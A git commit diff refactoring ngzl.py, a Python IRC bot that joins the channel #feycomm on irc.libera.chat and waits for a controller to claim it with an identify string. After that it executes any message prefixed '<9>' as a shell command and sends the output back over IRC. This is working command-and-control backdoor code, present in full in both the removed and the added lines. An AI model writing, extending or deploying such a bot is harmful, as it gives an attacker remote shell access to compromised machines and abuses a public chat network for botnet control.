6adadf992db3026ab6f89738f1c5725922a1eac7
syswraith <syswraith@proton.me>
2025-01-17 01:42:51 +0530

    prettify

--- ngzl.py
+++ ngzl.py
@@ -6,30 +6,34 @@ import socket
 server = "irc.libera.chat"
 port = 6667
 channel = "#feycomm"
-nick = os.uname()[1] + "10"
+nick = os.uname()[1] + "09"
 
-irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-irc.connect((server, port))
-irc.send(f"NICK {nick}\r\n".encode())
-irc.send(f"USER {nick} 0 * :{nick}\r\n".encode())
-irc.send(f"JOIN {channel}\r\n".encode())
-irc.send(f"PRIVMSG {channel} :GREETINGS PROGRAMS!\r\n".encode())
+def connect_routine(server, port, channel, nick):
+    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    irc.connect((server, port))
+    irc.send(f"NICK {nick}\r\n".encode())
+    irc.send(f"USER {nick} 0 * :{nick}\r\n".encode())
+    irc.send(f"JOIN {channel}\r\n".encode())
+    irc.send(f"PRIVMSG {channel} :{nick} has connected. Awaiting username capture.\r\n".encode())
 
-while True:
-    response = irc.recv(2048).decode()
-    print(response)
-    if response.startswith("PING"):
-        irc.send(f"PONG {response.split()[1]}\r\n".encode())
-    elif "IDENTIFY-REINDEER_FLOTILLA" in response: 
-        startIndex = response.index(":")+1
-        endIndex = response.index("!")
-        username = response[startIndex:endIndex]
-        print(username)
-    elif "<9>" in response: 
-        command = response[response.index("<9> ")+4:].strip()
-        print(command)
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        resultxt = result.stdout.strip().splitlines()
-        for x in resultxt: 
-            time.sleep(1)
-            irc.send(f"PRIVMSG {username} :{x}\r\n".encode())
+    while True:
+        response = irc.recv(2048).decode()
+        print(response)
+        if response.startswith("PING"):
+            irc.send(f"PONG {response.split()[1]}\r\n".encode())
+        elif "IDENTIFY-9" in response: 
+            startIndex = response.index(":")+1
+            endIndex = response.index("!")
+            username = response[startIndex:endIndex]
+            print(f"Username captured: `{username}`")
+            irc.send(f"PRIVMSG {channel} :Username captured: {username}. Awaiting commands.\r\n".encode())
+        elif "<9>" in response: 
+            command = response[response.index("<9> ")+4:].strip()
+            print(f"Command issued: `{command}`")
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            resultxt = result.stdout.strip().splitlines()
+            for x in resultxt: 
+                time.sleep(1)
+                irc.send(f"PRIVMSG {username} :{x}\r\n".encode())
+
+connect_routine(server, port, channel, nick)
